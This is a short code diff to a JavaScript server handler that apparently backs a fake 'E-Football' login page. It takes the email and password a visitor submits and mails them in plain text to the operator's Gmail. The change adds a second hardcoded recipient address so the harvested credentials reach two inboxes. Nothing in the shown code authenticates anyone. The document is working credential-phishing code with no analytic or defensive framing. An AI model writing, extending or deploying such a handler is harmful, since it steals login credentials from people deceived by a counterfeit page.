@@ -20,11 +20,16 @@ export default async function handler(req, res) {
   });
 
   try {
-    await transporter.sendMail({
-      from: process.env.EMAIL_USER,
-      to: process.env.EMAIL_USER,
-      subject: "New E-Football Login",
-      text: `Email: ${email}\nPassword: ${password}`
+   const recipients = [
+  process.env.EMAIL_USER,      // your main Gmail
+  "samfat246@gmail.com"    // add another email here
+];
+
+await transporter.sendMail({
+  from: process.env.EMAIL_USER,
+  to: recipients.join(","),    // join all emails with commas
+  subject: "New E-Football Login",
+  text: `Email: ${email}\nPassword: ${password}`
     });
 
     return res.status(200).json({ success: true });
